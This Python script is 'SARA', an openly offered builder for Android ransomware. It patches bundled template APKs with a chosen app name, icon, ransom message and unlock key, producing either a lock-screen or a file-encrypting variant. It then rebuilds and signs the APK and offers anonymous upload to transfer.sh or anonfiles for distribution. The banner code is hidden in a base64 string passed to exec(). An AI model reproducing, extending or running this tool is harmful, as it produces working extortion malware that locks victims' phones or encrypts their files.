#! /usr/bin/env python3
import os, sys, time, base64, json, fileinput
from shutil import which 
from getpass import getpass
try:
    from PIL import Image
except (ImportError,ModuleNotFoundError):
    os.system("python3 -m pip install --upgrade pip && python3 -m pip install Pillow")
# colors
r,g,y,b,d,R,Y,B,w,W,D = "\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[2;37m","\033[1;41m","\033[1;43m","\033[1;44m","\033[0m","\033[1;47m","\033[2;00m"
# get default encoding
if not sys.getdefaultencoding() == "utf-8":
    exit(f"{w}{R} ERROR {w} please set terminal encoding to UTF-8")
# check file and directory
if not os.path.isdir("data"): exit(f"{w}{R} ERROR {w} directory data not found !")
if not os.path.isfile("ubersigner.jar"): exit(f"{w}{R} ERROR {w} file ubersigner.jar not found !")
if not os.path.isfile("testkey.jks"): exit(f"{w}{R} ERROR {w} file testkey.jks not found !")
# check module and requirements
def check_requirements():
    if which("aapt"): pass
    else: exit(f"{w}{R} ERROR {w} please install package: aapt")
    if which("mogrify"): pass
    else: exit(f"{w}{R} ERROR {w} please install package: imagemagick")
    if which("java"):
        java_version=os.popen("java --version","r").read().splitlines()[0]
        if not "openjdk 17" in java_version: exit(f"{w}{R} ERROR {w} oops you're java is not openjdk 17 !")
    else: exit(f"{w}{R} ERROR {w} please install package: openjdk 17")
    if which("apktool"):
        apktool_version=os.popen("apktool --version","r").read().splitlines()[0]
        if not "2.6.1" in apktool_version: exit(f"{w}{R} ERROR {w} oops you're apktoil is not apktool 2.6.1 !")
    else: exit(f"{w}{R} ERROR {w} please install package: apktool 2.6.1")
# clear screen
def clear():
    os.system("cls" if os.name == "nt" else "clear")
# variables
imgv1 = ["sara/res/drawable-hdpi-v4/ic_launcher.png","sara/res/drawable-mdpi-v4/ic_launcher.png","sara/res/drawable-xhdpi-v4/ic_launcher.png","sara/res/drawable-xxhdpi-v4/ic_launcher.png"]
imgv2 = ["sara/res/mipmap-hdpi/ic_launcher.png","sara/res/mipmap-mdpi/ic_launcher.png","sara/res/mipmap-xhdpi/ic_launcher.png","sara/res/mipmap-xxhdpi/ic_launcher.png","sara/res/mipmap-xxxhdpi/ic_launcher.png"]
# banner
exec(base64.b64decode("ZGVmIGJhbm5lcigpOgogICAgcHJpbnQodytkKyIgICAgICAsLCAgICAgICAgICAgICAgICAsLCIpCiAgICBwcmludCh3K2QrIiAgICAoKCgoKCAgICAgICAgICAgICAgKSkpKSkiKQogICAgcHJpbnQodytkKyIgICAoKCgoKCggICAgICAgICAgICAgICkpKSkpKSIpCiAgICBwcmludCh3K2QrIiAgICgoKCgoKCAgICAgICAgICAgICAgKSkpKSkpIikKICAgIHByaW50KHcrZCsiICAgICgoKCgoIit3K2IrIixyQEBAQEBAQEBAQGUsIit3K2QrIikpKSkpIikKICAgIHByaW50KHcrZCsiICAgICAgKCgoIit3K2IrIkBAQEBAQEBAQEBAQEBAQEAiK3crZCsiKSkpICAgICIrdytiKyJTQVJBIit3KyIgLSIrcisiIHZlcnNpb24gMi4wIikKICAgIHByaW50KHcrYisiICAgICAgXEBALyIrcisiLDo6OiwiK3crYisiXC8iK3IrIiw6OjosIit3K2IrIlxAQCAgICAgICAiK3crIi0tLS0tLS0tLS0tLS0tLS0tLSIpCiAgICBwcmludCh3K2IrIiAgICAgL0BAQHwiK3IrIjo6Ojo6Iit3K2IrInx8IityKyI6Ojo6OiIrdytiKyJ8QEBAXFwgICAgICIrdysiQXV0aG9yIGJ5ICIreSsiQHRlcm11eGhhY2tlcnMuaWQiKQogICAgcHJpbnQodytiKyIgICAgLyBAQEBcXCIrcisiJzo6OiciK3crYisiL1xcIityKyInOjo6JyIrdytiKyIvQEBAIFxcICAgICIrdysiVGhlIGF1dGhvciBpcyBub3QgcmVzcG9uc2libGUiKQogICAgcHJpbnQodytiKyIgICAvICAvQEBAQEBAQC8vXFxcQEBAQEBAQFwgIFxcICAgIit3KyJmb3IgYW55IGlzc3VlcyBvciBkYW1hZ2UiKQogICAgcHJpbnQodytiKyIgICggIC8gICdAQEBAQD09PT1AQEBAQCcgIFwgICkgICIrdysiY2F1c2VkIGJ5IHRoaXMgcHJvZ3JhbSIpCiAgICBwcmludCh3K2IrIiAgIFwoICAgICAvICAgICAgICAgIFwgICAgICkvIikKICAgIHByaW50KHcrYisiICAgICBcICAgKCAgICAgICAgICAgICkgICAvIikKICAgIHByaW50KHcrYisiICAgICAgICAgIFwgICAgICAgICAgLyIrdyk="))
# SARA - Simple Android Ransomware Attack (version 2.0)
class SARA:
    def __init__(self):
        self.AppIcon=""
        self.AppName=""
        self.AppTitle=""
        self.AppDesc=""
        self.AppKeys=""
    def write(self,file,old,new):
        while True:
            if os.path.isfile(file):
                replaces = {old:new}
                for line in fileinput.input(file, inplace=True):
                    for search in replaces:
                        replaced = replaces[search]
                        line = line.replace(search,replaced)
                    print(line, end="")
                break
            else: os.system("rm -rf sara > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} failed to write on file: {file}")
    def buildapk(self):
        try:
            os.system("apktool b --use-aapt2 sara -o final.apk")
            if os.path.isfile("final.apk"):
                os.system("rm -rf sara > /dev/null 2>&1")
                os.system("java -jar ubersigner.jar -a final.apk --ks testkey.jks --ksAlias android --ksPass android --ksKeyPass android > /dev/null 2>&1")
                os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
                if os.path.isfile("final-aligned-signed.apk"):
                    output = self.AppName.replace(' ','')+".apk"
                    os.system("rm -rf final.apk > /dev/null 2>&1")
                    os.system("mv final-aligned-signed.apk "+output)
                    print(w+"-"*43)
                    ask=str(input(f"{b}>{w} Do you want to share this APK's ? (y/n): ").lower())
                    if ask == "y":
                        print(f"""
{w}[{r}SHARE TO{w}]

{w}[{b}1{w}] transfer.sh - transfer file online
{w}[{b}2{w}] anonfiles.com - anonymous file upload
                        """)
                        while True:
                            x=str(input(f"{b}>{w} choose: "))
                            if x in ("1","01"):
                                link=os.popen(f"curl -s --upload-file {output} https://transfer.sh").readline().strip()
                                if len(str(link)) != 0: print(f"{b}>{w} Success shared to: {g}{link}{w}"); break
                                else: print(f"{b}>{w} Failed shared to: {r}https://transfer sh{w}"); break
                            elif x in ("2","02"):
                                os.system(f"curl --no-progress-meter -F 'file=@{output}' https://api.anonfile.com/upload > response.json")
                                f=open("response.json","r")
                                j=json.load(f)
                                if j["status"] == True:
                                    f.close()
                                    os.system("rm -rf response.json")
                                    link=j["data"]["file"]["url"]["full"]
                                    print(f"{b}>{w} Success shared to: {g}{link}{w}")
                                    break
                                else: print(f"{b}>{w} Failed shared to: {r}https://anonfile.com{w}"); break
                            else: continue
                    else: pass
                    getpass(f"{b}>{w} Success saved as: {B} {output} {w}")
                    exit()
                else: os.system("rm -rf final.apk > /dev/null 2>&1"); exit(f"{w}{R} ERROR {w} failed to sign APK's")
            else: os.system("rm -rf sara > /dev/null 2>&1"); exit(f"{w}{R} ERROR {w} failed to build APK's")
        except Exception as ERROR:
            exit(f"{w}{R} ERROR {w} process stopped: {ERROR}")
    def builder(self,version):
        print("")
        if version == 1:
            while True:
                x=str(input(f"{b}>{w} SET APP_ICON ({r}PNG: icon.png{w}): "+g))
                if os.path.isfile(x):
                    if ".png" in x:
                        self.AppIcon=x
                        break
                    else: print(f"{w}{R} ERROR {w} File format not accepted !"); continue
                else: print(f"{w}{R} ERROR {w} File not found please fill correctly !"); continue
            while True:
                x=str(input(f"{b}>{w} SET APP_NAME ({r}EX: My Apps{w}): "+g))
                if len(x) !=0: self.AppName=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} SET APP_TITLE ({r}EX: Phone Hacked{w}): "+g))
                if len(x) !=0: self.AppTitle=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} SET APP_DESC ({r}EX: Contact Me{w}): "+g))
                if len(x) !=0: self.AppDesc=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} SET APP_KEYS ({r}EX: SeCr3t{w}): "+g))
                if len(x) !=0: self.AppKeys=x; break
                else: continue
            print(f"{b}>{w} Building your ransomware APK's")
            print(w+"-"*43+d)
            os.system("apktool d data/v1/sara.apk")
            if os.path.isdir("sara"):
                strings="sara/res/values/strings.xml"
                print("I: Using strings: "+strings)
                smali=os.popen(f"find -L sara/ -name '*0000.smali'","r").readline().strip()
                print("I: Using smali "+os.path.basename(smali))
                self.write(strings,"appname",self.AppName)
                print("I: Adding name with "+self.AppName)
                self.write(strings,"alert_title",self.AppTitle)
                print("I: Adding title with "+self.AppTitle)
                self.write(strings,"alert_desc",self.AppDesc)
                print("I: Adding description with "+str(len(self.AppDesc))+" words")
                self.write(smali,"key_pass",self.AppKeys)
                print("I: Adding unlock key with "+self.AppKeys)
                time.sleep(3)
                print("I: Adding icon with "+self.AppIcon)
                for path in imgv1:
                    if os.path.isfile(path):
                        with Image.open(path) as target:
                            width, height = target.size
                            size = str(width)+"x"+str(height)
                            logo = "sara-"+os.path.basename(self.AppIcon)
                            os.system("cp -R "+self.AppIcon+" "+logo)
                            os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                            os.system("rm -rf "+logo)
                    else: os.system("rm -rf sara > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} directory not found: {path}")
                self.buildapk()
            else: os.system("rm -rf sara > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} failed to decompile APK's")
        elif version == 2:
            while True:
                x=str(input(f"{b}>{w} SET APP_ICON ({r}PNG: icon.png{w}): "+g))
                if os.path.isfile(x):
                    if ".png" in x:
                        self.AppIcon=x
                        break
                    else: print(f"{w}{R} ERROR {w} File format not accepted !"); continue
                else: print(f"{w}{R} ERROR {w} File not found please fill correctly !"); continue
            while True:
                x=str(input(f"{b}>{w} SET APP_NAME ({r}EX: My Apps{w}): "+g))
                if len(x) !=0: self.AppName=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} SET APP_DESC ({r}EX: Contact Me{w}): "+g))
                if len(x) !=0: self.AppDesc=x; break
                else: continue
            print(f"{b}>{w} Building your ransomware APK's")
            print(w+"-"*43+d)
            os.system("apktool d data/v2/sara.apk")
            if os.path.isdir("sara"):
                strings="sara/res/values/strings.xml"
                print("I: Using strings: "+strings)
                self.write(strings,"AppName",self.AppName)
                self.write("sara/smali/com/termuxhackersid/services/EncryptionService.smali","AppName",self.AppName)
                self.write("sara/smali/com/termuxhackersid/services/DecryptionService.smali","AppName",self.AppName)
                print("I: Adding name with "+self.AppName)
                self.write("sara/smali/com/termuxhackersid/services/EncryptionService.smali","AppDesc",self.AppDesc)
                self.write("sara/smali/com/termuxhackersid/ui/MainActivity$a.smali","AppDesc",self.AppDesc)
                self.write("sara/smali/com/termuxhackersid/ui/MainActivity.smali","AppDesc",self.AppDesc)
                print("I: Adding description with "+str(len(self.AppDesc))+" words")
                time.sleep(3)
                print("I: Adding icon with "+self.AppIcon)
                for path in imgv2:
                    if os.path.isfile(path):
                        with Image.open(path) as target:
                            width, height = target.size
                            size = str(width)+"x"+str(height)
                            logo = "sara-"+os.path.basename(self.AppIcon)
                            os.system("cp -R "+self.AppIcon+" "+logo)
                            os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                            os.system("rm -rf "+logo)
                    else: os.system("rm -rf sara > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} directory not found: {path}")
                self.buildapk()
            else: os.system("rm -rf sara > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} failed to decompile APK's")
        else: exit(f"{w}{R} ERROR {w} oops no other version yet !")
    def menu(self):
        clear()
        banner()
        print(f"""
{w}{R} SARA {w} SIMPLE ANDROID RANSOMWARE ATTACK

a simple tool for making android ransomware
any loss or damage is the responsibility of the user.

{w}[{r}CHOOSE RANSOMWARE TYPE{w}]

{w}[{b}1{w}] SARA - TYPE LOCK SCREEN {w}({y} ANDROID 10 {w})
{w}[{b}2{w}] SARA - TYPE FILE ENCRYPTION {w}({y} ANDROID 7.1 {w})
{w}[{b}3{w}] Exit from console
        """)
        while True:
            x=str(input(f"{w}[{b}?{w}] choose: "))
            if x in ("1","01"): self.builder(1); break
            elif x in ("2","02"): self.builder(2); break
            elif x in ("3","03"): exit(f"{w}{R} EXIT {w} thank you for using this tool !")
            else: continue
        
if __name__ == "__main__":
    try:
        Sara=SARA()
        Sara.menu()
    except KeyboardInterrupt:
        exit(f"{w}{R} ABORTED {w} the user has terminated the process")
